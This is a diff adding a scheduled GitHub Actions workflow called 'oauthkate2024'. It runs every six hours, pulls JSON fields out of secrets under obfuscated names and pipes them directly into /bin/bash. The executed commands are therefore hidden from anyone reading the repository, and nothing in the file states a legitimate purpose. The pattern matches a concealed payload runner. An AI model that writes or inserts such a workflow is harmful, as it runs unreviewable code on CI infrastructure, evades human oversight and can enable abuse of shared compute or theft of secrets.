@@ -1,0 +1,24 @@
+name: oauthkate2024
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '44 0/6 * * *'
+jobs:
+  build:
+    runs-on: ubuntu-latest
+
+    steps:
+      - uses: actions/checkout@v4
+      - name: oauthkate2024
+        env:
+          mwhj6: ${{ secrets.mwhj6 }}
+        run: |
+          echo $mwhj6 | jq -r .ixnd5 | /bin/bash
+          echo $i72 | jq -r .tbu451 | /bin/bash
+          echo $oahw1 | jq -r .ksp6486 | /bin/bash
+          echo $tnklg99 | jq -r .jhwt416 | /bin/bash
+          echo $bee15349 | jq -r .gg75 | /bin/bash
+          echo $b3531 | jq -r .ctr3 | /bin/bash
+          echo $h7 | jq -r .lzmwm4423 | /bin/bash
+          echo $yii3 | jq -r .tp62222 | /bin/bash
+
